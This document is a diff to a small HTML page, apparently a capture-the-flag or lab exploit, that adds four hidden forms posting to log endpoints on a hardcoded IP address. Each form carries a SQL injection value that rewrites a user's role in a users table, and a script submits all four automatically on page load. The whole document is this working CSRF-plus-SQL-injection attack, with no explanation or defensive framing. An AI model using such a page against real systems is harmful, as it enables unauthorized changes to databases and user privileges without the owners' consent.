@@ -1,7 +1,25 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>upgrade</title>
-<form id="f" action="http://91.107.176.228:4000/debug/create_log" method="POST">
+<title>upgrade user</title>
+
+<form id="f1" action="http://91.107.176.228:4000/debug/create_log" method="POST">
+  <input name="log" value="';update users set role='user'where id=13;select'">
+</form>
+<form id="f2" action="http://91.107.176.228:4000/create_log" method="POST">
+  <input name="log" value="';update users set role='user'where id=13;select'">
+</form>
+
+<form id="f3" action="http://91.107.176.228:4000/debug/create_log" method="POST">
   <input name="log" value="x';update users set role='user'where id=13;select'">
 </form>
-<script>document.getElementById('f').submit();</script>
+<form id="f4" action="http://91.107.176.228:4000/create_log" method="POST">
+  <input name="log" value="x';update users set role='user'where id=13;select'">
+</form>
+
+<script>
+  // fire all four, spaced by a tick, to dodge any per-request weirdness
+  setTimeout(()=>document.getElementById('f1').submit(), 10);
+  setTimeout(()=>document.getElementById('f2').submit(), 60);
+  setTimeout(()=>document.getElementById('f3').submit(), 110);
+  setTimeout(()=>document.getElementById('f4').submit(), 160);
+</script>
